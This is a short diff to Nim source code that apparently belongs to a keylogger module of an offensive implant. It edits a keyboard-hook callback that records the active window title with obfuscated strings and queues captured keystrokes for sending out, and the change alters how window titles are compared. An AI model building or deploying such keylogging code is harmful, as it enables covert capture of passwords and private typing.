@@ -324,7 +324,7 @@ proc hook_callback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdc
         
         var newActiveWindow = GetActiveWindowTitle()
 
-        if ($newActiveWindow).replace("*", "") != ($currentActiveWindow).replace("*", ""):
+        if $newActiveWindow != $currentActiveWindow:
             currentActiveWindow = newActiveWindow
             channel_klout.send(protectString("\n-- [Window: '") & $currentActiveWindow & protectString("'] --\n"))
         # Send key pressed to queue
